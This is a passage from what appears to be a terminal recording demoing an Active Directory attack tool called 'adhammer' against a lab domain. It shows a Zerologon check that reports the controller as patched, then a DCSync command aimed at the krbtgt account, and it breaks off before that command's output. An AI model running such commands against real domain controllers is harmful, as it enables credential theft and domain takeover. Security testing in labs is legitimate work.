[9.5, "o", "\u001b[90mscan complete in 812 ms\u001b[0m\r\n\r\n"]
[11.0, "o", "\u001b[35m$\u001b[0m adhammer attack zerologon --host <dc-ip> --domain testlab.local\r\n"]
[13.0, "o", "\u001b[32;1m[+]\u001b[0m DC01.testlab.local — Zerologon \u001b[32;1msafe-detect\u001b[0m: NOT VULNERABLE (patched — 8 failed NetrServerAuthenticate3 attempts, all rejected)\r\n"]
[13.5, "o", "\u001b[90m54 ms — no state changes on the DC\u001b[0m\r\n\r\n"]
[15.0, "o", "\u001b[35m$\u001b[0m adhammer attack dcsync --host <dc-ip> --domain testlab.local --user administrator --password \u001b[90m********\u001b[0m --target krbtgt\r\n"]
